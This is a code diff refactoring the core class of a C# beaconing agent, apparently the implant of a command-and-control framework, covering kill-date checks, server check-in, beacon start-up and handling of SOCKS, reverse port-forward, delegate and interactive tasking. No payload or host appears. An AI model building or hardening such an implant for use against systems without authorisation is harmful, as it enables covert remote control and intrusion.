@@ -1,7 +1,7 @@
 ﻿using Agent.Interfaces;
 using Agent.Models;
 using Agent.Utilities;
-using Autofac;
+
 using System.Diagnostics;
 using System.Net;
 using System.Net.NetworkInformation;
@@ -33,20 +33,18 @@ namespace Agent
         }
         public async Task Start()
         {
-            try
+            if (!this.CheckKillDate())
             {
-                if (!this.CheckKillDate())
-                {
-                    Environment.Exit(0);
-                }
+                Environment.Exit(0);
+            }
 
-                await this.ApplyMods();
-                await this.CheckIn();
-                await this._profile.StartBeacon();
-            }
-            catch(Exception e)
+            await this.ApplyMods();
+            if (!await this.CheckIn())
             {
+                throw new InvalidOperationException("Agent check-in failed; beacon was not started.");
             }
+
+            await this._profile.StartBeacon();
         }
 
         private async Task ApplyMods()
@@ -106,7 +104,7 @@ namespace Agent
             {
                 CheckinResponse res = await _profile.Checkin(ct);
 
-                if (res is null || res.status != "success")
+                if (!CheckinResponseValidation.IsSuccessful(res))
                 {
                     return false;
                 }
@@ -145,44 +143,38 @@ namespace Agent
             return ipAddresses;
         }
 
-        private async void OnTaskingReceived(object sender, TaskingReceivedArgs args)
+        private void OnTaskingReceived(object sender, TaskingReceivedArgs args)
         {
-            //TODO: Try this
-            //Task proxyTask, socksTask, rpfwdTask, delegatesTask;
+            _ = ProcessTaskingAsync(args).ContinueWith(
+                task => logger.Log(task.Exception!.GetBaseException().ToString()),
+                CancellationToken.None,
+                TaskContinuationOptions.OnlyOnFaulted,
+                TaskScheduler.Default);
+        }
+
+        private async Task ProcessTaskingAsync(TaskingReceivedArgs args)
+        {
             if(args.tasking_response is null)
             {
                 return;
             }
 
-            _ = this.taskManager.HandleProxyResponses("socks", args.tasking_response.socks);
-
+            var work = new List<Task>();
+            if (args.tasking_response.socks is not null)
+                work.Add(this.taskManager.HandleProxyResponses("socks", args.tasking_response.socks));
             if (args.tasking_response.rpfwd is not null)
-            {
-                _ =this.taskManager.HandleProxyResponses("rportfwd", args.tasking_response.rpfwd);
-            }
-
+                work.Add(this.taskManager.HandleProxyResponses("rportfwd", args.tasking_response.rpfwd));
             if (args.tasking_response.tasks is not null)
-            {
-                Parallel.ForEach(args.tasking_response.tasks, async task =>
-                {
-                    _ = this.taskManager.StartTaskAsync(new ServerJob(task));
-                });
-            }
-
+                work.AddRange(args.tasking_response.tasks
+                    .Where(task => task is not null)
+                    .Select(task => this.taskManager.StartTaskAsync(new ServerJob(task))));
             if (args.tasking_response.delegates is not null)
-            {
-                _ = this.taskManager.HandleDelegateResponses(args.tasking_response.delegates);
-            }
-
-            if(args.tasking_response.responses is not null)
-            {
-                _ = this.taskManager.HandleServerResponses(args.tasking_response.responses);
-            }
-
-            if(args.tasking_response.interactive is not null)
-            {
-                _ = this.taskManager.HandleInteractiveResponses(args.tasking_response.interactive);
-            }
+                work.Add(this.taskManager.HandleDelegateResponses(args.tasking_response.delegates));
+            if (args.tasking_response.responses is not null)
+                work.Add(this.taskManager.HandleServerResponses(args.tasking_response.responses));
+            if (args.tasking_response.interactive is not null)
+                work.Add(this.taskManager.HandleInteractiveResponses(args.tasking_response.interactive));
+            await Task.WhenAll(work);
         }
         //Is this correct?
         private bool CheckKillDate()
